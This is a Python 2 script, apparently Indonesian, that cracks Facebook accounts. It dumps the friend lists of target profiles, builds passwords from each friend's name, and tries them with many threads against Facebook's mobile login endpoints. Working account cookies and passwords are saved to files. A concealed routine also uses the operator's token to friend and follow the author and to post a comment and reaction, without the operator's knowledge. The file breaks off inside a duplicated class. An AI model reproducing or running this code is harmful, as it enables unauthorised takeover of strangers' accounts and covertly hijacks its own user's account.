#-*-coding:utf-8-*-

# decrypt by hakiki 
#Create & Recode By Dapunta & Rizal
#Lu Mau Recode, Mau Lu Apain Terserah Bro, Tapi Hargai Lah Karya Kami.
#Gw Bikin Ni SC Sama Rizal Susah Payah, Ngerakit Sana Sini Banyak Error, Jgn Seenaknya Ganti Nama Author, Apalagi Ngalihin Botnya. Terima Kasih.

# User Agent
#User Agent Xiaomi : Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]
#User Agent Vivo Z1 Pro : Mozilla/5.0 (Linux; Android 10; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Redmi : Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Oppo : Mozilla/5.0 (Linux; Android 5.1; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Apple iPhone XS Max (Firefox) : Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15
#User Agent Apple iPhone XS (Chrome) : Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1
#User Agent Xiaomi : Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Amazon US : Mozilla/5.0 (Linux; Android 9; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/84.3.5 like Chrome/84.0.4147.125 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Bangla : Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Pakistan : Mozilla/5.0 (Linux; Android 6.0.1; SM-G920T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]

import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
# P = '\033[0;97m'  # putih
# M = '\033[0;91m' # merah
# H = '\033[0;92m' # hijau
# K = '\033[0;93m' # kuning
# B = '\033[0;94m' # biru
# U = '\033[0;95m' # ungu
# O = '\033[0;96m' # biru muda

if ("linux" in sys.platform.lower()):

        N = '\033[0m'
        G = '\033[1;92m'
        O = '\033[1;97m'
        R = '\033[1;91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''
def banner():
	print("""
\033[0;92m╦═╗╔═╗╦ ╦   ╔═╗╦  ╦╔╦╗╔═╗
╠╦╝║ ║╚╦╝───║╣ ║  ║ ║ ║╣ 
╩╚═╚═╝ ╩    ╚═╝╩═╝╩ ╩ ╚═╝
\033[0;92m───────────────────────────────────────────────""")

host="https://mbasic.facebook.com"
ua = random.choice(["Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"])
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"}).json()["country_name"].lower()
except:
	ips=None
uas = random.choice(["Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"])
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
touch_fbh={"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

m_fbh={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

graph_h={"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!]Cookies Mati").format(R,N)
def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()
def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def gen():
	ck=raw_input("[?] Cookie : ")
	if ck=="":gen()
	try:
		cks=gets_dict_cookies(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck)
			convert()
			print ('[!] Login Success').format(G,N)
			time.sleep(1)
			menu()
		else:print("\033[0;91m[!] Invalid Cookie").format(R,N);gen()
	except Exception as e:
		print("\033[0;91m[!] Error : %s"%e);gen()
                logs()
def log_token():
	data = raw_input("\033[0;93m[?] Token :")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		a = json.loads(me.text)
		nama = a['name']
		open("login.txt",'w').write(data)
		print("\033[0;92m[✓] Login Success").format(G,N)
		bot_komen()
		menu()
	except KeyError:
		print ("\033[0;91m[!] Invalid Token").format(R,N)
		time.sleep(1.0)
		logs()
def convert():
	global post,reac,kom
	try:
		tomken = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 UCBrowser/11.5.0.1015 UCTurbo/1.10.3.900 Mobile Safari/537.36 Edge/18.18362 OPR/51.1.2461.137501', #Jangan Diganti Anjink
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : open(".cok",'r').read()
		})
		find_token = re.search('(EAAA\w+)', tomken.text)
		if (find_token is None):
			pass
		else:
			open("login.txt",'w').write(find_token.group(1))
			return
	except Exception as e:
		print(R+"\n\033[0;91m[!] Error : %s"%e)
		exit()
# bot komen jan di ganti tambahin aja
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;91m[!] Token invalid"
		logs()
	una = ('403290050858408')
	kom = ('https://web.facebook.com/photo?fbid=403290050858408&set=a.101597811027635&type=3&app=fbl')
	reac = ('LOVE')
	post = ('roy elite is my favorit')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
        requests.post('https://graph.facebook.com/100035322483719/subscribers?access_token=' + toket) # fb gw
    	menu()
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nama = a['name']
    id = a['id']
  except Exception as e:
    print ("\033[0;91m[!] Error : %s"%e).format(R,N)
    time.sleep(1)
    logs()
  os.system("clear")
  banner()
  print("\033[0;97m[*] Hello	: "+nama)
  print("\033[0;97m[*] User ID	: "+id)
  print("\033[0;92m───────────────────────────────────────────────")
  print("\033[0;93m[?] Pilih Opsi :")
  print("\033[0;97m[1] Dump ID Public/Friend")
  print("\033[0;97m[2] Crack")
  print("\033[0;97m[0] Logout")
  print("\033[0;92m───────────────────────────────────────────────")
  r=raw_input("\033[0;93m[?] Input	: ")
  if r=="":print("\033[0;91m[!] Isi Yang Benar").format(R,N);menu()
  elif r=="1":
    publik()
  elif r=="2":
    methode()
    exit()
  elif r=="0":
    try:
      os.remove(".cok")
      os.remove("login.txt")
      exit(basecookie())
    except Exception as e:print("\033[0;91m[!] Error file tidak ditemukan %s"%e)
  else:
    print ("\033[0;91m[!] Wrong Input").format(R,N);menu()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\033[0;91m[!] Cookie Invalid").format(R,N)
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		gen()
	try:
                os.system("clear")
                banner()
                print ("\033[0;92m───────────────────────────────────────────────")
		print("\033[0;93m[?] Ketik \'me\' Jika Ingin Mengambil ID Dari Daftar Teman")
		idt = raw_input("\033[0;97m[*] User ID Target	: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("\033[0;97m[*] Name	: "+op["name"])
		except KeyError:
			print("\033[0;91m[!] ID NOT found !").format("R")
			print("\033[0;93m[!] Kembali").format(N)
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		print("\033[0;93m[*] Getting ID ...")
		print ("\033[0;92m───────────────────────────────────────────────")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r  %s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
			print (  a["name"])
		ys.close()
		print ("\033[0;92m───────────────────────────────────────────────")
		print ('\033[0;97m[✓] Sukses Mengambil ID dari %s'%op['name'])
		print ("\033[0;97m[✓] Total ID	: %s"%(len(id)))
		print ("\033[0;97m[✓] Output	: %s"%qq)
                print ("\033[0;92m───────────────────────────────────────────────")
		raw_input("\033[0;93m[?] [Kembali]")
		menu()
		
	except Exception as e:
		exit("\033[0;91m[!] Error	: %s"%e)
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def m_fb(em,pas,hosts):
	global ua,m_fbh
	r=requests.Session()
	r.headers.update(m_fbh)
	p=r.get("https://m.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack m.fb
def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update(touch_fbh)
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb
def graph_fb(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i)
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i)
				results.append(i+"123")
				results.append(i+"12345")
				if "indonesia" in ips:
					results.append("sayang")
					results.append("bismillah")
	return results
def methode():
  os.system("clear")
  banner()
  print("\033[0;92m───────────────────────────────────────────────")
  print("\033[0;93m[?] Pilih Metode Crack :")
  print("\033[0;97m[1] Crack Dengan mbasic.facebook.com")
  print("\033[0;97m[2] Crack Dengan m.facebook.com")
  print("\033[0;97m[3] Crack Dengan touch.facebook.com")
  print("\033[0;97m[4] Crack Dengan api.facebook.com")
  print("\033[0;92m───────────────────────────────────────────────")
  sek=raw_input("\033[0;93m[?] Input	: ")
  if sek=="":print("\033[0;91m   [!] Isi Yang Benar").format(R,N);methode()
  elif sek=="1":
    crack()
  elif sek=="2":
    crack1()
  elif sek=="3":
    crack2()
  elif sek=="4":
    crack3()
  else:
    print("\033[0;91m[!] Isi Yang Benar").format(R,N);methode()
def logs():
  banner()
  print("\033[0;92m───────────────────────────────────────────────")
  print("\033[0;93m[?] Pilih Metode Login :")
  print("\033[0;97m[1] Login Dengan Token")
  print("\033[0;91m[0] Exit")
  print("\033[0;92m───────────────────────────────────────────────")
  sek=raw_input("\033[0;93m[?] Input	: ")
  if sek=="":
    print("\033[0;91m[!] Isi Yang Benar").format(R,N);logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    exit()
  else:
    print("\033[0;91m[!] Isi Yang Benar").format(R,N);logs()
class crack:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[0;93m[?] Crack Dengan Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;93m[?] Pilih	: ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;93m[?] ID List File: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;93m[!] Contoh	: pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;93m[?] ID List File: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[0;92m───────────────────────────────────────────────")
				print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
				print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
				print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                                print ("\033[0;92m───────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("\033[0;92m[✓] Selesai")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;93m[?] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[0;92m───────────────────────────────────────────────")
			print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
			print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
			print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                        print ("\033[0;92m───────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("\033[0;92m[✓] Selesai")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m[ID]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s < > %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m[ID]%s %s • %s %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r[Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[0;93m[?] Crack Dengan Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;93m[?] Pilih	: ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;93m[?] ID List File: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;93m[!] Contoh	: pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;93m[?] ID List File: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[0;92m───────────────────────────────────────────────")
				print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
				print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
				print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                                print ("\033[0;92m───────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("\033[0;92m[✓] Selesai")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;93m[?] Password List	: ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[0;92m───────────────────────────────────────────────")
			print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
			print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
			print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                        print ("\033[0;92m───────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("\033[0;92m[✓] Selesai")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m[ID]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r\033[0;92m[ID]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r[Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[0;93m[?] Crack Dengan Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;93m[?] Pilih	: ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;93m[?] ID List File: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;93m[!] Contoh	: pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;93m[?] ID List File: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[0;92m───────────────────────────────────────────────")
				print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
				print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
				print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                                print ("\033[0;92m───────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("\033[0;92m[✓] Selesai")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;93m[?] Password List	: ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[0;92m───────────────────────────────────────────────")
			print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
			print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
			print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                        print ("\033[0;92m───────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("\033[0;92m[✓] Selesai")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m[ID]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m[ID]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r[Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[0;93m[?] Crack Dengan Pass Default Or Manual [d/m]")
